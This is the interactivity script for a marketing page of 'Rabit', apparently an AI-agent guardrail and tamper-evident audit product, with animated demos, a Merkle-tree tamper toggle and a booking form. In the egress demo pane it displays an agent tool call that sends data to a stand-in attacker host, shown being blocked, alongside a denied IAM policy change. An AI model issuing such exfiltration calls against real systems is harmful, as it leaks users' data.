/* Rabit — interactivity */
(function () {
  const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

  // ========= HERO PIPELINE =========
  const packet = document.getElementById('packet');
  const svg = document.getElementById('hero-svg');
  const stageNodes = svg ? svg.querySelectorAll('.stage-node') : [];
  const vTags = svg ? svg.querySelectorAll('.v-tag') : [];
  const chip = document.getElementById('verdict-chip');

  const xs = [60, 140, 220, 300, 380];

  function runHero() {
    if (!svg) return;
    stageNodes.forEach(n => { n.classList.remove('active', 'done'); });
    vTags.forEach(t => { t.setAttribute('opacity', '0'); });
    chip.classList.remove('visible');

    if (reduced) {
      stageNodes.forEach(n => n.classList.add('done'));
      vTags.forEach(t => t.setAttribute('opacity', '1'));
      chip.classList.add('visible');
      packet.setAttribute('x', 376);
      packet.setAttribute('y', 106);
      return;
    }

    const start = performance.now();
    const duration = 2200;
    const x0 = 26, x1 = 378;

    function frame(now) {
      const t = Math.min(1, (now - start) / duration);
      const x = x0 + (x1 - x0) * t;
      packet.setAttribute('x', x);
      packet.setAttribute('y', 106);

      for (let i = 0; i < xs.length; i++) {
        const node = stageNodes[i];
        if (x + 4 >= xs[i] && !node.classList.contains('done')) {
          node.classList.add('active');
          setTimeout(() => {
            node.classList.remove('active');
            node.classList.add('done');
          }, 380);
          const tag = vTags[i];
          if (tag) tag.setAttribute('opacity', '1');
        }
      }

      if (t < 1) requestAnimationFrame(frame);
      else setTimeout(() => chip.classList.add('visible'), 200);
    }
    setTimeout(() => requestAnimationFrame(frame), 500);
  }

  if (svg) {
    const heroObserver = new IntersectionObserver((entries) => {
      entries.forEach(e => {
        if (e.isIntersecting) { runHero(); heroObserver.disconnect(); }
      });
    }, { threshold: 0.3 });
    heroObserver.observe(svg);
  }

  const replay = document.getElementById('viz-replay');
  if (replay) replay.addEventListener('click', runHero);

  // ========= TIMELINE REVEAL =========
  const timeline = document.getElementById('timeline');
  const tlRows = timeline ? timeline.querySelectorAll('[data-row]') : [];
  if (timeline) {
    if (reduced) {
      timeline.classList.add('visible');
      tlRows.forEach(r => r.classList.add('visible'));
    } else {
      const tlObs = new IntersectionObserver((entries) => {
        entries.forEach(e => {
          if (e.isIntersecting) {
            timeline.classList.add('visible');
            tlRows.forEach((r, i) => {
              setTimeout(() => r.classList.add('visible'), 200 + i * 120);
            });
            tlObs.disconnect();
          }
        });
      }, { threshold: 0.15 });
      tlObs.observe(timeline);
    }
  }

  // ========= PANE A — policy =========
  const paneA = document.getElementById('pane-a');
  const paL1 = document.getElementById('pa-l1');
  const paL2 = document.getElementById('pa-l2');
  const paHl = document.getElementById('pane-a-hl');
  const layerBadges = paneA ? paneA.querySelectorAll('.layer-badge') : [];
  const cmdA = 'agent invoke aws.iam.put_user_policy --user=svc-agent';
  const denyA = 'DENY · policy=staging-agents-v3 · reason=scope_violation · latency=187ms';

  function typeInto(el, text, speed = 14, cls = '') {
    return new Promise(resolve => {
      let i = 0;
      el.className = cls;
      el.textContent = '';
      function step() {
        if (i <= text.length) { el.textContent = text.slice(0, i); i++; setTimeout(step, speed); }
        else resolve();
      }
      step();
    });
  }

  async function runPaneA() {
    if (!paneA) return;
    if (reduced) {
      paL1.textContent = cmdA;
      paL2.textContent = denyA; paL2.className = 'deny';
      layerBadges.forEach(b => b.classList.add('lit'));
      paHl.classList.add('hl');
      return;
    }
    paL1.textContent = ''; paL2.textContent = ''; paL2.className = '';
    layerBadges.forEach(b => b.classList.remove('lit'));
    paHl.classList.remove('hl');

    await typeInto(paL1, cmdA, 14);
    await new Promise(r => setTimeout(r, 300));
    for (let i = 0; i < layerBadges.length; i++) {
      layerBadges[i].classList.add('lit');
      await new Promise(r => setTimeout(r, 220));
    }
    await new Promise(r => setTimeout(r, 200));
    await typeInto(paL2, denyA, 10, 'deny');
    paHl.classList.add('hl');
  }

  // ========= PANE B — egress =========
  const paneB = document.getElementById('pane-b');
  const pbL1 = document.getElementById('pb-l1');
  const pbL2 = document.getElementById('pb-l2');
  const pbL3 = document.getElementById('pb-l3');

  async function runPaneB() {
    if (!paneB) return;
    if (reduced) {
      pbL1.textContent = 'agent.web_fetch("https://attacker.example/exfil?data=…")';
      pbL2.textContent = 'connect() → EACCES'; pbL2.className = 'deny';
      pbL3.textContent = 'egress not in allowlist for tool=web_fetch';
      paneB.classList.add('deny');
      return;
    }
    pbL1.textContent = ''; pbL2.textContent = ''; pbL2.className = ''; pbL3.textContent = '';
    paneB.classList.remove('deny');

    await typeInto(pbL1, 'agent.web_fetch("https://attacker.example/exfil?data=…")', 10);
    await new Promise(r => setTimeout(r, 300));
    paneB.classList.add('deny');
    await new Promise(r => setTimeout(r, 350));
    await typeInto(pbL2, 'connect() → EACCES', 12, 'deny');
    await typeInto(pbL3, 'egress not in allowlist for tool=web_fetch', 8, 'muted');
  }

  // ========= PANE C — merkle =========
  const merkleLeaves = document.getElementById('merkle-leaves');
  const merkleInner = document.getElementById('merkle-inner');
  const merkleEdges = document.getElementById('merkle-edges');
  const mToggle = document.getElementById('merkle-toggle');
  const pcL1 = document.getElementById('pc-l1');
  const pcL2 = document.getElementById('pc-l2');
  const pcL3 = document.getElementById('pc-l3');
  const pcL4 = document.getElementById('pc-l4');

  const leafHashes = ['a1b2c3', 'd4e5f6', '7a8b9c', '2d3e4f', '5g6h7i', '8j9k0l', 'mn1o2p'];
  const honestRoot = '7f3a…b21c';
  const tamperedRoot = '9c1e…4a8b';

  function drawMerkle(tampered) {
    if (!merkleLeaves) return;
    merkleLeaves.innerHTML = '';
    merkleInner.innerHTML = '';
    merkleEdges.innerHTML = '';

    const W = 360, leafY = 120, innerY = 75, lvl2Y = 35, rootY = 8;
    const n = 7;
    const padX = 16;
    const leafW = 38, leafH = 16;
    const gap = (W - padX * 2 - leafW * n) / (n - 1);

    const leafX = [];
    for (let i = 0; i < n; i++) {
      const x = padX + i * (leafW + gap);
      leafX.push(x + leafW / 2);
      const r = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
      r.setAttribute('x', x); r.setAttribute('y', leafY - leafH / 2);
      r.setAttribute('width', leafW); r.setAttribute('height', leafH);
      r.setAttribute('rx', 1);
      if (tampered && i === 3) r.setAttribute('class', 'tampered');
      merkleLeaves.appendChild(r);
      const t = document.createElementNS('http://www.w3.org/2000/svg', 'text');
      t.setAttribute('x', x + leafW / 2); t.setAttribute('y', leafY + 3);
      t.setAttribute('text-anchor', 'middle');
      t.textContent = (tampered && i === 3) ? 'ff9a1b' : leafHashes[i];
      merkleLeaves.appendChild(t);
    }

    const lvl1X = [
      (leafX[0] + leafX[1]) / 2,
      (leafX[2] + leafX[3]) / 2,
      (leafX[4] + leafX[5]) / 2,
      leafX[6],
    ];
    const lvl2X = [
      (lvl1X[0] + lvl1X[1]) / 2,
      (lvl1X[2] + lvl1X[3]) / 2,
    ];
    const rootX = (lvl2X[0] + lvl2X[1]) / 2;

    const pairings = [[0, 1, 0], [2, 3, 1], [4, 5, 2], [6, null, 3]];
    pairings.forEach(([a, b, p]) => {
      const px = lvl1X[p], py = innerY;
      [a, b].forEach(k => {
        if (k === null) return;
        const e = document.createElementNS('http://www.w3.org/2000/svg', 'path');
        e.setAttribute('d', `M ${leafX[k]} ${leafY - leafH / 2} L ${px} ${py + 8}`);
        e.setAttribute('class', 'edge' + (tampered && (k === 3 || p === 1) ? ' tampered' : ''));
        merkleEdges.appendChild(e);
      });
      const r = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
      r.setAttribute('x', px - 18); r.setAttribute('y', py - 6);
      r.setAttribute('width', 36); r.setAttribute('height', 14); r.setAttribute('rx', 1);
      if (tampered && p === 1) r.setAttribute('class', 'tampered');
      merkleInner.appendChild(r);
      const t = document.createElementNS('http://www.w3.org/2000/svg', 'text');
      t.setAttribute('x', px); t.setAttribute('y', py + 4);
      t.setAttribute('text-anchor', 'middle'); t.setAttribute('font-size', '8');
      t.textContent = (tampered && p === 1) ? 'cf19..' : ['b1c2..', 'd3e4..', 'f5a6..', 'b7c8..'][p];
      merkleInner.appendChild(t);
    });

    [[0, 1, 0], [2, 3, 1]].forEach(([a, b, p]) => {
      const px = lvl2X[p], py = lvl2Y;
      [a, b].forEach(k => {
        const e = document.createElementNS('http://www.w3.org/2000/svg', 'path');
        e.setAttribute('d', `M ${lvl1X[k]} ${innerY - 6} L ${px} ${py + 8}`);
        e.setAttribute('class', 'edge' + (tampered && p === 0 ? ' tampered' : ''));
        merkleEdges.appendChild(e);
      });
      const r = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
      r.setAttribute('x', px - 18); r.setAttribute('y', py - 6);
      r.setAttribute('width', 36); r.setAttribute('height', 14); r.setAttribute('rx', 1);
      if (tampered && p === 0) r.setAttribute('class', 'tampered');
      merkleInner.appendChild(r);
      const t = document.createElementNS('http://www.w3.org/2000/svg', 'text');
      t.setAttribute('x', px); t.setAttribute('y', py + 4);
      t.setAttribute('text-anchor', 'middle'); t.setAttribute('font-size', '8');
      t.textContent = (tampered && p === 0) ? '4d2a..' : ['2f8e..', '9b4c..'][p];
      merkleInner.appendChild(t);
    });

    [0, 1].forEach(k => {
      const e = document.createElementNS('http://www.w3.org/2000/svg', 'path');
      e.setAttribute('d', `M ${lvl2X[k]} ${lvl2Y - 6} L ${rootX} ${rootY + 10}`);
      e.setAttribute('class', 'edge' + (tampered ? ' tampered' : ''));
      merkleEdges.appendChild(e);
    });
    const rr = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
    rr.setAttribute('x', rootX - 26); rr.setAttribute('y', rootY);
    rr.setAttribute('width', 52); rr.setAttribute('height', 14); rr.setAttribute('rx', 1);
    rr.setAttribute('class', tampered ? 'tampered' : 'root');
    merkleInner.appendChild(rr);
    const rt = document.createElementNS('http://www.w3.org/2000/svg', 'text');
    rt.setAttribute('x', rootX); rt.setAttribute('y', rootY + 10);
    rt.setAttribute('text-anchor', 'middle'); rt.setAttribute('font-size', '8.5');
    rt.textContent = tampered ? tamperedRoot : honestRoot;
    merkleInner.appendChild(rt);
    const lbl = document.createElementNS('http://www.w3.org/2000/svg', 'text');
    lbl.setAttribute('x', rootX + 40); lbl.setAttribute('y', rootY + 10);
    lbl.setAttribute('class', 'lbl');
    lbl.textContent = 'ROOT';
    merkleInner.appendChild(lbl);
  }

  async function runPaneC(tampered = false) {
    drawMerkle(tampered);

    [pcL1, pcL2, pcL3, pcL4].forEach(el => { if (el) { el.textContent = ''; el.className = ''; } });

    if (reduced) {
      if (tampered) {
        pcL1.textContent = 'chain OK'; pcL1.className = 'ok';
        pcL2.textContent = 'merkle MISMATCH at leaf[237]'; pcL2.className = 'deny';
        pcL3.textContent = `recomputed ${tamperedRoot} ≠ anchored ${honestRoot}`; pcL3.className = 'muted';
      } else {
        pcL1.textContent = 'chain OK'; pcL1.className = 'ok';
        pcL2.textContent = 'merkle OK'; pcL2.className = 'ok';
        pcL3.textContent = 'tsa OK'; pcL3.className = 'ok';
        pcL4.textContent = 'verification complete'; pcL4.className = 'ok';
      }
      return;
    }

    await new Promise(r => setTimeout(r, 500));
    if (tampered) {
      await typeInto(pcL1, 'chain OK', 10, 'ok');
      await new Promise(r => setTimeout(r, 120));
      await typeInto(pcL2, 'merkle MISMATCH at leaf[237]', 8, 'deny');
      await new Promise(r => setTimeout(r, 120));
      await typeInto(pcL3, `recomputed ${tamperedRoot} ≠ anchored ${honestRoot}`, 6, 'muted');
    } else {
      await typeInto(pcL1, 'chain OK', 10, 'ok');
      await new Promise(r => setTimeout(r, 100));
      await typeInto(pcL2, 'merkle OK', 10, 'ok');
      await new Promise(r => setTimeout(r, 100));
      await typeInto(pcL3, 'tsa OK', 10, 'ok');
      await new Promise(r => setTimeout(r, 100));
      await typeInto(pcL4, 'verification complete', 10, 'ok');
    }
  }

  if (mToggle) {
    let isTamp = false;
    mToggle.setAttribute('aria-pressed', 'false');
    mToggle.addEventListener('click', () => {
      isTamp = !isTamp;
      mToggle.textContent = isTamp ? 'Show honest' : 'Show tamper';
      mToggle.setAttribute('aria-pressed', isTamp ? 'true' : 'false');
      runPaneC(isTamp);
    });
  }

  const panes = document.querySelectorAll('.pane');
  const paneObs = new IntersectionObserver((entries) => {
    entries.forEach(e => {
      if (e.isIntersecting) {
        const id = e.target.id;
        if (id === 'pane-a') runPaneA();
        if (id === 'pane-b') runPaneB();
        if (id === 'pane-c') runPaneC(false);
        paneObs.unobserve(e.target);
      }
    });
  }, { threshold: 0.35 });
  panes.forEach(p => paneObs.observe(p));

  // ========= PIPELINE SECTION (scroll-linked) =========
  const bigStages = document.querySelectorAll('.big-stage');
  const stagePanels = document.querySelectorAll('.stage-panel');
  const pipeSection = document.getElementById('pipeline');

  function updatePipelineActive() {
    if (!pipeSection) return;
    const rect = pipeSection.getBoundingClientRect();
    const vh = window.innerHeight;
    if (rect.bottom < 0 || rect.top > vh) return;
    const sectionH = rect.height;
    const progressed = Math.max(0, Math.min(1, (vh * 0.6 - rect.top) / (sectionH * 0.7)));
    const active = Math.min(4, Math.max(0, Math.floor(progressed * 5)));
    bigStages.forEach((s, i) => s.classList.toggle('active', i === active));
    stagePanels.forEach((s, i) => s.classList.toggle('active', i === active));
  }
  window.addEventListener('scroll', updatePipelineActive, { passive: true });
  updatePipelineActive();

  // ========= CHAIN BLOCKS (tamper sim → updates verifier panel) =========
  const chainBlocks = document.querySelectorAll('#chain-row .chain-block');
  const verifierPre = document.getElementById('verifier-pre');
  const verifierHonest = verifierPre ? verifierPre.innerHTML : '';
  const verifierTampered =
    `<span class="prompt">$</span> rabit-verify ./bundle-2026-04-15.zip
<span class="ok">[OK]</span>  bundle signature verified (Ed25519)
<span class="fail">[FAIL]</span> hash chain broken at entry 237 <span class="muted">(record_hash mismatch)</span>
<span class="fail">[FAIL]</span> merkle root mismatch <span class="muted">(recomputed 9c1e…4a8b ≠ anchored 7f3a…b21c)</span>
<span class="ok">[OK]</span>  RFC 3161 timestamp valid — 2026-04-15T23:59:59Z
<span class="ok">[OK]</span>  OWASP LLM01, LLM06, LLM07 evidence present
<span class="ok">[OK]</span>  NIST SP 800-53 SC-7(5) evidence present
<span class="ok">[OK]</span>  EU AI Act Art 12 log completeness verified
verification complete — <span class="err-summary">2 errors</span>
<span class="muted">trust anchor: offline</span>`;

  function syncVerifier() {
    if (!verifierPre) return;
    const anyTampered = Array.from(chainBlocks).some(b => b.classList.contains('tampered'));
    if (anyTampered) {
      verifierPre.innerHTML = verifierTampered;
      verifierPre.classList.add('tampered');
    } else {
      verifierPre.innerHTML = verifierHonest;
      verifierPre.classList.remove('tampered');
    }
  }

  chainBlocks.forEach(b => {
    b.addEventListener('click', () => {
      const tampered = b.classList.toggle('tampered');
      const idx = parseInt(b.dataset.chain, 10);
      const prev = chainBlocks[idx - 1] && chainBlocks[idx - 1].querySelector('.chain-connector');
      const here = b.querySelector('.chain-connector');
      if (prev) prev.classList.toggle('broken', tampered);
      if (here) here.classList.toggle('broken', tampered);
      syncVerifier();
    });
  });

  // ========= CAL EMBED =========
  const calGrid = document.getElementById('cal-grid-days');
  const calSlots = document.getElementById('cal-slots');
  const calSelDay = document.getElementById('cal-selected-day');
  const calMonth = document.getElementById('cal-month');
  const cfSlot = document.getElementById('cf-slot');

  const MONTH_LONG = ['January','February','March','April','May','June','July','August','September','October','November','December'];
  const MONTH_SHORT = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];

  const now = new Date();
  const calYear = now.getFullYear();
  const calMonthIdx = now.getMonth();
  const today = now.getDate();
  const monthShort = MONTH_SHORT[calMonthIdx];
  const daysInMonth = new Date(calYear, calMonthIdx + 1, 0).getDate();
  const firstDow = (new Date(calYear, calMonthIdx, 1).getDay() + 6) % 7; // Mon=0

  // Next 6 business days within current month
  const availDays = [];
  {
    const cursor = new Date(calYear, calMonthIdx, today);
    while (availDays.length < 6) {
      cursor.setDate(cursor.getDate() + 1);
      if (cursor.getMonth() !== calMonthIdx) break;
      const dow = cursor.getDay();
      if (dow !== 0 && dow !== 6) availDays.push(cursor.getDate());
    }
  }

  const initialDay = availDays.length ? availDays[0] : today;
  let selectedDayLabel = `${monthShort} ${initialDay}`;

  function buildCal() {
    if (!calGrid) return;
    if (calMonth) calMonth.textContent = `${MONTH_LONG[calMonthIdx]} ${calYear}`;
    if (calSelDay) calSelDay.textContent = selectedDayLabel;

    calGrid.innerHTML = '';
    for (let i = 0; i < firstDow; i++) {
      const d = document.createElement('div');
      d.className = 'cal-day muted';
      calGrid.appendChild(d);
    }
    for (let i = 1; i <= daysInMonth; i++) {
      const d = document.createElement('button');
      d.type = 'button';
      d.textContent = i;
      d.className = 'cal-day';
      if (i < today) d.classList.add('muted');
      else if (availDays.includes(i)) d.classList.add('avail');
      else if (i !== today) d.classList.add('muted');
      if (i === today) d.classList.add('today');
      if (i === initialDay) d.classList.add('selected');
      d.addEventListener('click', () => {
        if (!d.classList.contains('avail') && !d.classList.contains('today')) return;
        calGrid.querySelectorAll('.cal-day').forEach(x => x.classList.remove('selected'));
        d.classList.add('selected');
        selectedDayLabel = `${monthShort} ${i}`;
        if (calSelDay) calSelDay.textContent = selectedDayLabel;
        if (cfSlot) cfSlot.value = '';
        buildSlots();
      });
      calGrid.appendChild(d);
    }
    buildSlots();
  }

  function buildSlots() {
    if (!calSlots) return;
    calSlots.innerHTML = '';
    ['09:30', '10:00', '11:30', '13:00', '14:30', '15:00', '16:30'].forEach(s => {
      const b = document.createElement('button');
      b.type = 'button';
      b.className = 'cal-slot';
      b.textContent = `${s} PT`;
      b.setAttribute('aria-label', `Book ${selectedDayLabel} at ${s} PT`);
      b.addEventListener('click', () => {
        calSlots.querySelectorAll('.cal-slot').forEach(x => x.classList.remove('picked'));
        b.classList.add('picked');
        if (cfSlot) cfSlot.value = `${selectedDayLabel} ${s} PT`;
      });
      calSlots.appendChild(b);
    });
    if (cfSlot && !cfSlot.value) {
      cfSlot.value = `${selectedDayLabel} (no time selected)`;
    }
  }

  buildCal();

  // ========= FORM AJAX SUBMIT (stay on page) =========
  const form = document.getElementById('cal-form');
  if (form) {
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const submitBtn = form.querySelector('button[type="submit"]');
      const originalLabel = submitBtn.textContent;
      submitBtn.disabled = true;
      submitBtn.textContent = 'Sending…';

      try {
        const data = new FormData(form);
        const res = await fetch(form.action, {
          method: 'POST',
          body: data,
          headers: { 'Accept': 'application/json' }
        });

        if (res.ok) {
          form.innerHTML = `
            <div class="form-success">
              <div class="form-success-mark">✓</div>
              <h3>Booking received.</h3>
              <p>I'll confirm the time within 24 hours at the email you provided.
              If you don't hear back, ping <a href="mailto:adam.shibli2001@gmail.com">adam.shibli2001@gmail.com</a> directly.</p>
            </div>
          `;
        } else {
          submitBtn.disabled = false;
          submitBtn.textContent = originalLabel;
          alert('Something went wrong. Please email adam.shibli2001@gmail.com directly.');
        }
      } catch (err) {
        submitBtn.disabled = false;
        submitBtn.textContent = originalLabel;
        alert('Network error. Please email adam.shibli2001@gmail.com directly.');
      }
    });
  }
})();
